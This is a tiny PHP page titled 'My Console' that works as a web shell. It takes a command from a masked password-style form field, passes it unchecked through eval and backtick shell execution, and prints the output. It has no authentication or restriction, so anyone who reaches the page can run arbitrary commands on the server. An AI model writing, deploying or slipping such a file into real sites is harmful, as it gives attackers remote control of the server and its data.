<?php
//echo `ls -lha`;
//var_dump($_POST);
$cmd = isset($_POST['cmd']) ? $_POST['cmd'] : '';
?>
<!doctype html>
<meta charset="utf-8">
<title>My Console</title>

<form method="post">
    <input type="password" name="cmd">
    <input type="submit" value="Run">
</form>
<pre>
<?php eval('echo `' . $cmd . '`;'); ?>
</pre>
